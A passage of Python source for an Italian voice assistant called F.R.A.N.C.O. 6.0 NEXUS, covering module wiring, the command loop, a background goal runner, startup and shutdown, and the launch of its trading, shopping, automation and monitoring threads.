            logger=self.logger,
            state=self.state,
            event_bus=self.event_bus,
            command_queue=self._command_queue,
            voice_synth=self.tts
        )

        # Scheduler
        self.scheduler = TaskScheduler(
            logger=self.logger,
            state=self.state,
            event_bus=self.event_bus,
            db=self.db,
            command_engine=self.engine,
            memory=self.memory
        )

        # UI
        self.ui = HolographicUI(
            state=self.state,
            event_bus=self.event_bus,
            logger=self.logger,
            transcript_buffer=self.voice.get_transcript_buffer()
                             if hasattr(self.voice, 'get_transcript_buffer')
                             else deque(),
            command_queue=self._command_queue
        )
        self.franco_code = FrancoCode(
            DATA_DIR,
            logger=self.logger,
            ui_state=self.state,
            announce=lambda message: threading.Thread(
                target=self.tts.speak,
                args=(message,),
                kwargs={"blocking": True},
                daemon=True,
                name="FrancoCodeVoice",
            ).start(),
            complete_notify=self._notify_franco_code_complete,
        )
        self.spotify = SpotifyAdapter()
        self.ui._franco_ref = self   # riferimento per i pannelli sezione
        self.franco_code.resume_pending(
            lambda step, stop: self._franco_code_worker(
                self.franco_code.snapshot().get("goal", ""), step, stop))
        from .turn_lifecycle import TurnLifecycle
        self.turn_lifecycle = TurnLifecycle(self._on_turn_timeout,
            timeout=float(os.environ.get("FRANCO_TURN_TIMEOUT", "45")))

        # Disk Cleaner (Jarvis-style)
        self.disk_cleaner = DiskCleaner(self.logger)
        self.engine.disk_cleaner = self.disk_cleaner

        # Home Assistant Bridge
        self.home_assistant = HomeAssistantBridge(self.logger, self.config)
        self.engine.home_assistant = self.home_assistant

        # Proactive Monitor
        self.proactive = ProactiveMonitor(
            state=self.state,
            memory=self.memory,
            db=self.db,
            tts=self.tts,
            ai=self.ai,
            logger=self.logger,
            event_bus=self.event_bus,
        )

        # Push Notifier (ntfy.sh / Telegram)
        self.notifier = PushNotifier(self.config, self.logger)

        # Mobile Bridge — controllo da telefono via HTTP/SSE
        self.mobile = MobileBridge(
            config=self.config,
            command_queue=self._command_queue,
            state=self.state,
            memory=self.memory,
            transcript_buffer=(self.voice.get_transcript_buffer()
                               if hasattr(self.voice, 'get_transcript_buffer')
                               else deque(maxlen=40)),
            logger=self.logger,
            push_notifier=self.notifier,
            event_bus=self.event_bus,
        )
        self.engine.mobile = self.mobile

        # Phone Bridge — controllo di FRANCO tramite chiamata telefonica (Twilio)
        # Disattivo di default finche' non sono impostate le variabili d'ambiente
        # richieste (vedi franco_phone.py per la guida completa alla configurazione).
        try:
            from franco_phone import FrancoPhone
            self.phone = FrancoPhone(
                engine=self.engine,
                logger=self.logger,
                tts=self.tts,
                port=int(self.config.get("phone.port", 8766)),
                public_base_url=self.config.get("phone.public_base_url", ""),
            )
            self.engine.phone = self.phone
        except Exception as e:
            self.phone = None
            self.logger.warning("CORE", f"Phone Bridge non caricato: {e}")

        # Registra event handlers
        self._register_events()

        self.logger.success("CORE", "F.R.A.N.C.O. 6.0 NEXUS inizializzato")

    def _register_events(self):
        """Register system event handlers"""

        def on_wake(event: EventData):
            user_name = self.memory.get_user_name()
            self.state.set("system_state", SystemState.LISTENING)
            greeting = self._get_time_greeting()
            self.tts.speak(f"{greeting}, {user_name}. Come posso aiutarti?")

        def on_reminder_due(event: EventData):
            rem = event.data.get("reminder", {})
            title = rem.get("title", "Promemoria")
            self.tts.speak(f"Attenzione, {self.memory.get_user_name()}! {title}")

        def on_command_processed(event: EventData):
            self.state.set("system_state", SystemState.IDLE)

        def on_speaking_change(key, old, new):
            if new:
                self.state.set("system_state", SystemState.SPEAKING)
            elif self.state.get("listening"):
                self.state.set("system_state", SystemState.LISTENING)
            else:
                self.state.set("system_state", SystemState.IDLE)

        def on_trading_order(event: EventData):
            """Notifica vocale quando un ordine di trading viene eseguito."""
            data = event.data or {}
            sym = data.get("symbol", "")
            side = data.get("side", "")
            qty = data.get("qty", "")
            price = data.get("price", "")
            if sym and side:
                msg = f"Ordine {side} eseguito: {qty} {sym} a ${price}." if price else f"Ordine {side} su {sym} inviato."
                self.tts.speak(msg)
                try:
                    self.mobile.push_speech(msg)
                except Exception as _e:
                    pass  # suppressed error

        def on_trading_alert(event: EventData):
            """Notifica vocale per alert di trading (stop-loss, target, ecc.)."""
            data = event.data or {}
            msg = data.get("message", "")
            level = data.get("level", "info")
            if msg:
                if level in ("danger", "warning"):
                    self.tts.speak(msg)
                try:
                    self.mobile.push_speech(msg)
                except Exception as _e:
                    pass  # suppressed error

        self.event_bus.subscribe("voice.wake", on_wake)
        self.event_bus.subscribe("reminder.due", on_reminder_due)
        self.event_bus.subscribe("command.processed", on_command_processed)
        self.event_bus.subscribe("trading.order", on_trading_order)
        self.event_bus.subscribe("trading.alert", on_trading_alert)
        self.event_bus.subscribe("turn.cancel_requested", lambda event: self.turn_lifecycle.cancel())
        self.event_bus.subscribe("voice.partial", self._on_voice_partial)
        self.state.observe("speaking", on_speaking_change)

    def _on_voice_partial(self, event):
        """Prepare intent locally from partial ASR; partial text never executes."""
        text = (event.data or {}).get("text", "") if hasattr(event, "data") else ""
        if text:
            kind = self.latency_router.classify(text) if self.latency_router else "standard"
            self.state.set("partial_intent_class", kind, notify=False)

    def _on_turn_timeout(self, turn):
        message = "Non sono riuscito a completare la richiesta in tempo. Puoi riprovarla o affidarla a Franco Code."
        self.state.set("thinking", False)
        try:
            self.ui.push_notification(message, "warning")
            self.voice._transcript_buffer.append(("FRANCO", message, datetime.now()))
            threading.Thread(target=self.tts.speak, args=(message,), daemon=True,
                             name="TurnTimeoutVoice").start()
        except Exception:
            pass

    def _get_time_greeting(self) -> str:
        hour = datetime.now().hour
        if hour < 12:
            return "Buongiorno"
        if hour < 18:
            return "Buon pomeriggio"
        return "Buona sera"

    def _highlight_voice_command(self, cmd: str):
        """Mette in EVIDENZA il comando vocale ricevuto: riquadro a schermo,
        canale log dedicato 'VOICE' ed evento sul bus per la UI."""
        try:
            print("\n" + highlight_voice_command(cmd), flush=True)
        except Exception:
            pass
        try:
            self.logger.success("VOICE", f"🎙  COMANDO VOCALE » {cmd}")
        except Exception:
            pass
        try:
            eb = getattr(self, "event_bus", None)
            if eb:
                eb.emit("voice.command", command=cmd, source="CommandLoop")
        except Exception:
            pass

    def _notify_franco_code_complete(self, message: str):
        """Deliver a guaranteed visible completion without exposing internals."""
        try:
            self.ui.push_notification(message, "info")
            self.voice._transcript_buffer.append(("FRANCO", message, datetime.now()))
        except Exception as error:
            self.logger.warning("CODE", f"Notifica UI fallita: {error}")
        try:
            if DEPENDENCIES_STATUS.get("plyer"):
                from plyer import notification
                notification.notify(title="Franco Code", message=message, timeout=8)
        except Exception as error:
            self.logger.debug("CODE", f"Notifica Windows non disponibile: {error}")

    def _franco_code_worker(self, goal, step, stop_event):
        if stop_event.is_set():
            return False
        prompt = ("Modalità Franco Code. Obiettivo persistente: " + goal +
                  "\nFase corrente: " + step +
                  "\nLavora in background. Rispetta conferme, autorizzazioni e percorsi. "
                  "Restituisci un esito verificabile e conciso.")
        result = self.engine.process(prompt)
        return bool(result and not str(result).lower().startswith("errore"))

    def _handle_franco_code_command(self, command: str):
        """Gestisce obiettivi persistenti e controlli di Franco Code."""
        text = command.strip()
        low = text.lower()
        if low in ("report", "dammi il report", "sì dammi il report", "si dammi il report",
                   "report franco code"):
            return self.franco_code.report()
        if low in ("confermo franco code", "autorizzo franco code", "confermo l'azione"):
            resumed = self.franco_code.confirm_and_resume(
                lambda step, stop: self._franco_code_worker(
                    self.franco_code.snapshot().get("goal", ""), step, stop))
            return "Conferma ricevuta. Franco Code riprende il lavoro." if resumed else "Conferma registrata."
        if low in ("stato franco code", "franco code stato"):
            snap = self.franco_code.snapshot()
            if not snap.get("goal"):
                return "Franco Code non ha un obiettivo attivo."
            return (f"Franco Code è {snap['status']}. Obiettivo: {snap['goal']}. "
                    f"Fase: {snap['phase']}. Passo {snap['step']} di {snap['total_steps']}.")
        if low in ("pausa franco code", "metti in pausa franco code"):
            self.franco_code.pause()
            return "Franco Code è in pausa."
        if low in ("riprendi franco code", "continua franco code"):
            self.franco_code.resume()
            return "Franco Code ha ripreso il lavoro."
        if low in ("ferma franco code", "stop franco code"):
            self.franco_code.stop()
            return "Sto fermando Franco Code in modo sicuro."
        match = re.match(r"(?:franco code|obiettivo franco code)\s*[:,-]?\s+(.+)", text,
                         flags=re.IGNORECASE | re.DOTALL)
        if not match:
            return None
        goal = match.group(1).strip()
        steps = [
            "Analizza l'obiettivo, il contesto disponibile e i vincoli espliciti.",
            "Esegui le azioni necessarie usando solo strumenti e percorsi autorizzati.",
            "Controlla il risultato osservabile e correggi gli errori recuperabili.",
            "Salva il risultato e prepara un aggiornamento sintetico per l'utente.",
        ]

        self.franco_code.start(goal, steps,
                               lambda step, stop: self._franco_code_worker(goal, step, stop))
        return ("Obiettivo fissato. Franco Code lavorerà in background e ti parlerà "
                "solo quando c'è un aggiornamento utile, un risultato o serve una decisione.")

    def _command_loop(self):
        """Process commands from voice/text queue"""
        self.logger.info("CORE", "Command loop avviato")
        while self.state.get("running"):
            turn_id = None
            try:
                cmd = self._command_queue.get(timeout=0.5)
                if cmd == "__PALETTE__":
                    continue

                # ── Hotword strip: rimuovi "Franco", "Jarvis", "ok franco" dall'inizio
                _hotwords = ("franco,", "franco ", "jarvis,", "jarvis ",
                             "ok franco", "ok jarvis", "ehi franco", "hey franco",
                             "ehi jarvis", "hey jarvis")
                _cmd_clean = cmd.strip()
                for hw in _hotwords:
                    _low = _cmd_clean.lower()
                    if _low.startswith(hw):
                        _cmd_clean = _cmd_clean[len(hw):].strip()
                        break
                if _cmd_clean:
                    cmd = _cmd_clean
                turn_id = self.turn_lifecycle.begin(cmd)

                self.state.set("system_state", SystemState.PROCESSING)
                self.state.set("thinking", True)

                # ── Aggiungi al transcript dell'utente
                try:
                    if hasattr(self.voice, '_transcript_buffer'):
                        self.voice._transcript_buffer.append(("USER", cmd, datetime.now()))
                except Exception as _e:
                    pass  # suppressed error

                # ── Router sezione: se la UI ha una sezione attiva non-home/chat,
                #    il comando vocale viene smistato anche nell'output inline
                _ui_routed = False
                try:
                    ui = getattr(self, "ui", None)
                    if ui and hasattr(ui, "_active_section"):
                        sec = ui._active_section
                        if sec not in ("home", "chat"):
                            ui._push_sec_output(sec, f"● {cmd}", color="dim")
                            _ui_routed = True
                except Exception as _e:
                    pass  # suppressed error

                # ── EVIDENZA COMANDO VOCALE ──
                self._highlight_voice_command(cmd)

                canvas_response = self.ui._canvas.apply_command(cmd)
                if canvas_response is not None:
                    self.ui._active_section = "canvas"
                code_response = self._handle_franco_code_command(cmd) if canvas_response is None else None
                spotify_response = self.spotify.handle(cmd) if code_response is None and canvas_response is None else None
                if canvas_response is not None:
                    response = canvas_response
                elif code_response is not None:
                    response = code_response
                elif spotify_response is not None:
                    response = spotify_response
                else:
                    response = self.engine.process(cmd)

                self.state.set("thinking", False)

                if not self.turn_lifecycle.finish(turn_id):
                    self._command_queue.task_done()
                    continue

                # Mostra risposta nella sezione attiva
                if _ui_routed and response:
                    try:
                        ui._push_sec_output(sec, response)
                    except Exception as _e:
                        pass  # suppressed error

                if response:
                    mood = self.state.get("mood", MoodType.NEUTRAL)
                    threading.Thread(target=self.tts.speak, args=(response,),
                                     kwargs={"mood": mood}, daemon=True,
                                     name="ResponseVoice").start()
                    # Riapri la finestra di conversazione: dopo la risposta di
                    # Franco puoi replicare senza ripetere "ehi Franco".
                    if not self.state.get("standby"):
                        self.state.set(
                            "conversation_until",
                            time.time() + CONVERSATION_FOLLOWUP_WINDOW,
                            notify=False,
                        )
                    # Aggiungi al transcript
                    if hasattr(self.voice, '_transcript_buffer'):
                        self.voice._transcript_buffer.append(("FRANCO", response, datetime.now()))
                    # Push risposta a client mobile (SSE + ntfy)
                    try:
                        self.mobile.push_speech(response)
                    except Exception as _e:
                        pass  # suppressed error
                    # Memoria episodica: il secondo cervello ricorda gli scambi sostanziosi
                    try:
                        if (getattr(self, "brain", None) and len(cmd) > 12
                                and len(response) > 40):
                            self.brain.ingest_conversation(cmd, response)
                    except Exception as _e:
                        pass  # suppressed error

                self._command_queue.task_done()

            except queue.Empty:
                continue
            except Exception as e:
                self.logger.exception("CORE", "Command loop error", e)
                self.state.set("thinking", False)
                if turn_id:
                    self.turn_lifecycle.finish(turn_id, "failed")
                message = "Ho incontrato un errore e non ho completato la richiesta."
                try:
                    self.ui.push_notification(message, "warning")
                    self.voice._transcript_buffer.append(("FRANCO", message, datetime.now()))
                except Exception:
                    pass

    def _text_input_loop(self):
        """Fallback text input loop (quando voice non disponibile)"""
        import sys as _sys
        user_name = self.memory.get_user_name()

        # Se stdin non è un terminale interattivo (pipe, redirect, background)
        # non usare input() — rimane in modalità headless silenziosa
        if not _sys.stdin.isatty():
            self.logger.info("CORE", "Stdin non è un terminale — modalità headless silenziosa")
            while self.state.get("running", True):
                time.sleep(1)
            return

        print("\n[FRANCO] Modalità testo. Digita un comando o 'esci' per uscire.")
        print(f"[FRANCO] {self._get_time_greeting()}, {user_name}!\n")

        while self.state.get("running"):
            try:
                user_input = input(f"[{user_name}] > ").strip()
                if not user_input:
                    continue
                if user_input.lower() in ("esci", "quit", "exit", "bye", "spegni"):
                    self.state.set("running", False)
                    break
                self._command_queue.put(user_input)
            except EOFError:
                # stdin chiuso (pipe terminata) — resta in attesa senza uscire
                time.sleep(1)
            except KeyboardInterrupt:
                self.state.set("running", False)
                break
            except Exception as _e:
                pass  # suppressed error

    def startup_greeting(self):
        """Speak startup greeting — Jarvis style"""
        user_name = self.memory.get_user_name()
        sessions  = self.memory.get("statistiche.sessioni", 1)
        greeting  = self._get_time_greeting()

        # Costruisci il briefing iniziale Jarvis-style
        parts = []
        if sessions == 1:
            parts.append(f"{greeting}! Sono F.R.A.N.C.O. versione sei punto zero NEXUS, "
                         f"operativo e pronto ai suoi ordini, {user_name}.")
        else:
            parts.append(f"{greeting}, {user_name}. Sessione numero {sessions} avviata.")

        # Stato moduli attivi
        moduli = []
        if getattr(self, "trading", None):
            moduli.append("Trading")
        if getattr(self, "brain", None):
            moduli.append("Second Brain")
        if getattr(self, "auto", None):
            moduli.append("Automazioni")
        if moduli:
            parts.append(f"Moduli attivi: {', '.join(moduli)}.")

        # Promemoria in scadenza
        try:
            due = self.db.get_upcoming_reminders(hours=1)
            if due:
                parts.append(f"Attenzione: ha {len(due)} promemoria nelle prossime ore.")
        except Exception as _e:
            pass  # suppressed error

        # CPU/RAM snapshot al boot
        try:
            cpu = self.state.get("cpu_percent", 0)
            ram = self.state.get("ram_percent", 0)
            if cpu and ram and float(cpu) > 0:
                parts.append(f"Sistema: CPU {float(cpu):.0f}%, RAM {float(ram):.0f}%.")
        except Exception as _e:
            pass  # suppressed error

        parts.append("Come posso aiutarla?")
        self.tts.speak(" ".join(parts))

    def run(self, use_voice: bool = True, use_ui: bool = True):
        """
        Main entry point.
        Avvia tutti i thread e l'UI principale.
        """
        self.logger.info("CORE", "Avvio FRANCO 6.0 NEXUS...")
        self.state.set("running", True)
        self.state.set("system_state", SystemState.IDLE)
        self.state.set("initialized", True)

        # Aggiorna IP
        self.state.set("local_ip", get_local_ip())

        # Avvia scheduler
        self.scheduler.start()

        # Avvia monitor proattivo (Jarvis-style)
        self.proactive.start()

        # Avvia Mobile Bridge (controllo da telefono)
        mobile_url = self.mobile.start()
        if mobile_url:
            self.logger.success("CORE", f"App mobile disponibile → {mobile_url}")

        # Avvia Phone Bridge (controllo via chiamata telefonica reale, Twilio)
        # Resta silenzioso se non configurato — non e' un errore, e' lo stato
        # di default finche' l'utente non completa il setup (vedi franco_phone.py).
        if getattr(self, "phone", None):
            self.phone.start()

        # Thread: command loop
        cmd_thread = threading.Thread(
            target=self._command_loop, daemon=True, name="CommandLoop"
        )
        cmd_thread.start()

        # Thread: voice recognition
        voice_available = (DEPENDENCIES_STATUS.get('speech_recognition') and
                          (DEPENDENCIES_STATUS.get('pyaudio') or
                           DEPENDENCIES_STATUS.get('speech_recognition')))

        if use_voice and voice_available:
            voice_thread = threading.Thread(
                target=self.voice.start_listening, daemon=True, name="VoiceListener"
            )
            voice_thread.start()
            self.state.set("listening", True)
            self.state.set("system_state", SystemState.LISTENING)
        else:
            # Fallback: input testuale in thread separato
            text_thread = threading.Thread(
                target=self._text_input_loop, daemon=True, name="TextInput"
            )
            text_thread.start()

        # Saluto iniziale
        greeting_thread = threading.Thread(
            target=self.startup_greeting, daemon=True
        )
        greeting_thread.start()

        # UI (blocking se pygame disponibile)
        if use_ui and DEPENDENCIES_STATUS.get('pygame'):
            self.ui.run()
        else:
            # Headless: attendi finché running
            self.logger.info("CORE", "Modalità headless avviata")
            while self.state.get("running"):
                time.sleep(0.5)

        # Shutdown
        self._shutdown()

    def _shutdown(self):
        """Graceful shutdown"""
        self.logger.info("CORE", "Spegnimento in corso...")
        self.state.set("running", False)

        # Saluta
        user_name = self.memory.get_user_name()
        try:
            self.tts.speak(f"Arrivederci, {user_name}. Sessione terminata.")
        except Exception as _e:
            pass  # suppressed error

        # Stop moduli
        try:
            self.voice.stop()
        except Exception as _e:
            pass  # suppressed error
        try:
            self.scheduler.stop()
        except Exception as _e:
            pass  # suppressed error
        try:
            self.turn_lifecycle.stop()
        except Exception:
            pass
        try:
            self.proactive.stop()
        except Exception as _e:
            pass  # suppressed error
        try:
            self.mobile.stop()
        except Exception as _e:
            pass  # suppressed error
        try:
            self.tts.cleanup_temp_files()
        except Exception as _e:
            pass  # suppressed error

        # Salva stato
        try:
            self.memory.force_save()
        except Exception as _e:
            pass  # suppressed error
        try:
            self.db.close()
        except Exception as _e:
            pass  # suppressed error
        try:
            self.cache.shutdown()
        except Exception as _e:
            pass  # suppressed error

        # Statistiche sessione
        uptime = self.state.get("uptime_seconds", 0)
        cmds = self.state.get("commands_executed", 0)
        self.logger.success("CORE",
            f"Sessione terminata. Uptime: {format_duration(uptime)}, "
            f"comandi: {cmds}")


# ==============================================================================
# ENTRY POINT
# ==============================================================================

def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="F.R.A.N.C.O. 6.0 NEXUS — Full Responsive Autonomous Neural Control Operator"
    )
    parser.add_argument("--no-voice", action="store_true",
                        help="Disabilita riconoscimento vocale (modalità testo)")
    parser.add_argument("--no-ui", action="store_true",
                        help="Modalità headless (senza interfaccia grafica)")
    parser.add_argument("--text-only", action="store_true",
                        help="Solo testo, senza voce né UI")
    parser.add_argument("--debug", action="store_true",
                        help="Abilita log debug")
    parser.add_argument("--theme", type=str, default="nexus",
                        choices=list(THEMES.keys()),
                        help="Tema UI (default: nexus)")
    parser.add_argument("--voice", type=str, default="xtts",
                        choices=list(TTS_VOICES.keys()),
                        help="Voce TTS (default: XTTS locale; fallback Diego)")
    parser.add_argument("--api-key", type=str, default="",
                        help="Chiave API Anthropic Claude (sovrascrive variabile ambiente)")
    return parser.parse_args()


def main():
    """Main entry point"""
    args = parse_args()

    # Chiave API da argomento se fornita
    if args.api_key:
        os.environ["CLAUDE_API_KEY"] = args.api_key

    # Tema
    global ACTIVE_THEME
    if args.theme:
        ACTIVE_THEME = args.theme

    # Avvia FRANCO
    try:
        franco = FrancoCore()
        from franco_trading import TradingModule, patch_trading
        franco.trading = TradingModule(franco.logger, franco.state, franco.db,
                                       franco.event_bus, franco.memory, franco.tts)
        patch_trading(franco.engine, franco.trading)

        # Trading autonomo: avvia da solo entrambi i motori, senza bisogno di
        # comandi vocali. SICUREZZA: entrambi rifiutano di operare con soldi
        # veri a meno che il broker non sia esplicitamente live E allow_live
        # non venga passato True (mai fatto qui) — quindi restano su paper.
        try:
            msg_rot = franco.trading.start_rotation()
            franco.logger.info("TRADING", f"Rotazione autonoma: {msg_rot}")
        except Exception as e:
            franco.logger.warning("TRADING", f"Avvio rotazione fallito: {e}")
        try:
            msg_auto = franco.trading.autotrader.start()
            franco.logger.info("TRADING", f"AutoTrader: {msg_auto}")
        except Exception as e:
            franco.logger.warning("TRADING", f"Avvio AutoTrader fallito: {e}")
        # Stream dati di mercato in tempo reale (WebSocket Alpaca IEX)
        try:
            msg_stream = franco.trading.start_stream()
            franco.logger.info("TRADING", f"Stream real-time: {msg_stream}")
        except Exception as e:
            franco.logger.warning("TRADING", f"Avvio stream fallito: {e}")

        # Shopping automation + chat UI
        try:
            from franco_shopping import ShoppingManager, ShoppingChatUI, patch_shopping
            franco.shopping = ShoppingManager(
                ai=getattr(franco, "omni", None) or getattr(franco, "router", None),
                tts=franco.tts,
                logger=franco.logger,
            )
            franco.shopping_ui = ShoppingChatUI(franco.shopping)
            franco.shopping._chat_ui = franco.shopping_ui
            patch_shopping(franco.engine, franco.shopping, franco.logger)
            # Registra comando vocale "apri shopping" / "apri carrello"
            try:
                _orig_process = franco.engine.process
                def _with_shop_open(raw: str) -> str:
                    t = raw.lower().strip()
                    if any(k in t for k in ["apri shopping","apri carrello","chat shopping",
                                            "negozio","shop","spesa"]):
                        franco.shopping_ui.open()
                        return "Chat shopping aperta."
                    return _orig_process(raw)
                franco.engine.process = _with_shop_open
            except Exception as _e:
                pass  # suppressed error
        except Exception as _shop_err:
            franco.logger.warning("SHOP", f"Shopping module non caricato: {_shop_err}")
            franco.shopping = None

        # Automation Engine
        try:
            from franco_automations import AutomationEngine, patch_automations
            franco.auto = AutomationEngine(
                franco=franco,
                logger=franco.logger,
                event_bus=franco.event_bus,
                tts=franco.tts,
                command_engine=franco.engine,
                state=franco.state,
                shopping=getattr(franco, "shopping", None),
            )
            patch_automations(franco.engine, franco.auto, franco.logger)
            franco.auto.start()
        except Exception as _auto_err:
            franco.logger.warning("AUTO", f"Automation Engine non caricato: {_auto_err}")
            franco.auto = None

        # Modalità Antivirus rimossa: nessun monitor o scansione parte in background.
        franco.av = None

        # Configura voce iniziale
        if args.voice != "onyx":
            franco.tts.change_voice(args.voice)

        # Debug level
        if args.debug:
            franco.logger.set_level(LogLevel.DEBUG)

        # Thread: aggiorna pannello trading nella UI ogni 15 secondi
        def _trading_panel_updater():
            while franco.state.get("running", True):
                try:
                    t = franco.trading
                    acct = t.broker.get_account_info() if hasattr(t, "broker") and t.broker else {}
                    positions_raw = t.broker.get_positions() if hasattr(t, "broker") and t.broker else {}
                    pnl_pct = 0.0
                    try:
                        total = float(acct.get("total_value", 0) or 0)
                        day_start = float(franco.state.get("trading_day_start", total) or total)
                        if not franco.state.get("trading_day_start"):
                            franco.state.set("trading_day_start", total)
                        pnl_pct = (total / day_start - 1) * 100 if day_start else 0
                    except Exception:
                        total = 0
                    positions = []
                    for sym, pos in list(positions_raw.items())[:5]:
                        positions.append({
                            "symbol": sym,
                            "pnl_pct": getattr(pos, "unrealized_pct", 0) or 0,
                        })
                    stream_on = False
                    try:
                        stream_on = "attivo" in t.stream_status_text().lower() or "connesso" in t.stream_status_text().lower()
                    except Exception as _e:
                        pass  # suppressed error
                    franco.state.set("trading_panel", {
                        "total_value": total,
                        "day_pnl_pct": pnl_pct,
                        "positions": positions,
                        "stream_active": stream_on,
                    })
                    # Allarme perdita giornaliera > 3%
                    if pnl_pct < -3.0:
                        msg = f"Attenzione! Il portafoglio è sceso del {pnl_pct:.1f}% oggi."
                        franco.event_bus.emit("proactive.alert",
                                              data={"message": msg, "level": "danger"})
                except Exception as _e:
                    pass  # suppressed error
                time.sleep(15)

        threading.Thread(target=_trading_panel_updater, daemon=True,
                         name="TradingPanelUpdater").start()

        # Briefing automatico all'avvio (dopo 3 secondi per lasciare che tutto si inizializzi)
        def _startup_brief():
            time.sleep(3)
            try:
                brief = franco.engine._cmd_daily_brief()
                if brief:
                    franco.tts.speak(brief)
            except Exception as _e:
                pass  # suppressed error
        threading.Thread(target=_startup_brief, daemon=True, name="StartupBrief").start()

        # ── Monitor Jarvis: proactive watcher ogni 60s ──────────────────────────
        def _jarvis_watcher():
            """Jarvis mode: FRANCO monitora silenziosamente e parla da solo
            quando rileva cose importanti — come Jarvis nel film."""
            import time as _time
            import datetime as _dt
            _time.sleep(10)  # attendi startup
            _prev_pnl = 0.0
            _av_alerted = False
            _last_reminder_check = 0.0
            _cpu_warned = False
            _last_hour_spoken = -1

            while franco.state.get("running", True):
                try:
                    now = _dt.datetime.now()

                    # 1. Trading: allarme perdita/guadagno > 2%
                    td = franco.state.get("trading_panel", {})
                    pnl = float(td.get("day_pnl_pct", 0) or 0)
                    if abs(pnl - _prev_pnl) > 2.0:
                        direction = "guadagnato" if pnl > _prev_pnl else "perso"
                        msg = (f"Aggiornamento portafoglio: abbiamo {direction} il "
                               f"{abs(pnl - _prev_pnl):.1f}% nelle ultime ore. "
                               f"P&L totale oggi: {pnl:+.2f}%.")
                        franco.tts.speak(msg)
                        try:
                            ui = getattr(franco, "ui", None)
                            if ui: ui._push_sec_output("trading", f"▤ {msg}")
                        except Exception as _e:
                            pass  # suppressed error
                        _prev_pnl = pnl

                    # 3. CPU alta: avvisa se > 90% per 2 cicli consecutivi
                    cpu = float(franco.state.get("cpu_percent", 0) or 0)
                    if cpu > 90 and not _cpu_warned:
                        msg = f"Avviso sistema: CPU al {cpu:.0f}%. Potrebbe esserci un processo anomalo."
                        franco.tts.speak(msg)
                        _cpu_warned = True
                    elif cpu < 70:
                        _cpu_warned = False

                    # 4. Promemoria in scadenza (ogni 5 minuti)
                    now_ts = _time.time()
                    if now_ts - _last_reminder_check > 300:
                        _last_reminder_check = now_ts
                        try:
                            due = franco.engine.db.get_upcoming_reminders(hours=1)
                            if due:
                                r = due[0]
                                msg = f"Promemoria in scadenza: {r.get('title', '?')}."
                                franco.tts.speak(msg)
                        except Exception as _e:
                            pass  # suppressed error

                    # 5. Ora piena (ogni ora): announce time se non in standby
                    if (now.minute == 0 and now.hour != _last_hour_spoken
                            and not franco.state.get("standby")):
                        _last_hour_spoken = now.hour
                        msg = f"Sono le {now.hour}:00."
                        franco.tts.speak(msg)

                except Exception as _e:
                    pass  # suppressed error
                _time.sleep(60)

        threading.Thread(target=_jarvis_watcher, daemon=True, name="JarvisWatcher").start()

        # Run
        use_voice = not (args.no_voice or args.text_only)
        use_ui = not (args.no_ui or args.text_only)
        franco.run(use_voice=use_voice, use_ui=use_ui)

    except KeyboardInterrupt:
        print("\n[FRANCO] Interruzione utente. Arrivederci.")
    except Exception as e:
        print(f"[FRANCO] Errore critico: {e}")
        traceback.print_exc()
    finally:
        # Cleanup finale garantito
        for tmp_file in TEMP_DIR.glob("*"):
            try:
                tmp_file.unlink()
            except Exception as _e:
                pass  # suppressed error


if __name__ == "__main__":
    import os, sys
    os.environ.setdefault("PYTHONUTF8", "1")
    if sys.stdout.encoding and sys.stdout.encoding.lower() not in ("utf-8", "utf8"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    main()
